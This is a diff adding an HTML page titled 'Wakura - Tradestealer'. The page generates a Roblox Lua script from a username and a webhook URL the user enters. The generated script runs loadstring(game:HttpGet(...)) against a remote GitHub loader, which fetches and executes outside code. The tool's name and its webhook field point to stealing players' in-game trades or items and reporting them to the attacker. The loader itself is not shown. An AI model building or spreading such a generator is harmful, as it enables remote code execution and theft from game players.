@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Wakura - Tradestealer</title>
+  <style>
+    body {
+        font-family: 'Roboto', sans-serif;
+        background: linear-gradient(135deg, #6e8efb, #a777e3);
+        color: #333;
+        text-align: center;
+        margin: 0;
+        padding: 0;
+    }
+    .container {
+        max-width: 800px;
+        margin: 50px auto;
+        padding: 30px;
+        background: #ffffff;
+        border-radius: 12px;
+        box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+    }
+    h1 {
+        color: #333;
+        font-size: 2.5em;
+        margin-bottom: 20px;
+    }
+    form {
+        margin: 0 auto;
+        padding: 20px;
+        background: #f8f9fa;
+        border-radius: 8px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+    label {
+        display: block;
+        font-weight: bold;
+        margin-bottom: 5px;
+    }
+    input, textarea {
+        display: block;
+        width: calc(100% - 22px);
+        margin: 10px auto;
+        padding: 12px;
+        border: 1px solid #ccc;
+        border-radius: 6px;
+        font-size: 16px;
+        background-color: #ffffff;
+    }
+    input:focus, textarea:focus {
+        border-color: #007bff;
+        outline: none;
+    }
+    button {
+        background-color: #007bff;
+        color: white;
+        border: none;
+        padding: 12px 24px;
+        font-size: 16px;
+        border-radius: 6px;
+        cursor: pointer;
+        transition: background-color 0.3s ease, transform 0.2s ease;
+    }
+    button:hover {
+        background-color: #0056b3;
+        transform: scale(1.05);
+    }
+    button:active {
+        background-color: #004494;
+    }
+    textarea {
+        height: 150px;
+        resize: vertical;
+    }
+    #status {
+        margin-top: 20px;
+        font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Wakura Generator</h1>
+    <form id="scriptForm">
+      <label for="username">Username:</label>
+      <input type="text" id="username" name="username" required><br><br>
+
+      <label for="webhook">Webhook:</label>
+      <input type="url" id="webhook" name="webhook" required><br><br>
+
+      <button type="button" id="generateBtn">Generate</button>
+      <textarea id="output" readonly placeholder="Generated script will appear here"></textarea><br>
+
+      <button type="button" id="copyBtn">Copy to Clipboard</button>
+    </form>
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      const generateButton = document.getElementById('generateBtn');
+      const copyButton = document.getElementById('copyBtn');
+
+      generateButton.addEventListener('click', function(event) {
+        event.preventDefault(); 
+
+        const username = document.getElementById("username").value;
+        const webhook = document.getElementById("webhook").value;
+
+        if (!username || !webhook) {
+          alert("Please fill in all required fields.");
+          return;
+        }
+
+        const outputString = `--Website made by Rusdi\n` +
+                             `Username = "${username}"\n` +
+                             `Webhook = "${webhook}"\n\n` +
+                             `loadstring(game:HttpGet("https://raw.githubusercontent.com/rusdiplays/loader/main/Load"))()`;
+
+        document.getElementById("output").value = outputString;
+      });
+
+      copyButton.addEventListener('click', function() {
+        const copyText = document.getElementById("output");
+        copyText.select();
+        copyText.setSelectionRange(0, 99999);
+        document.execCommand("copy");
+        alert("Copied to clipboard!");
+      });
+    });
+  </script>
+</body>
+</html>
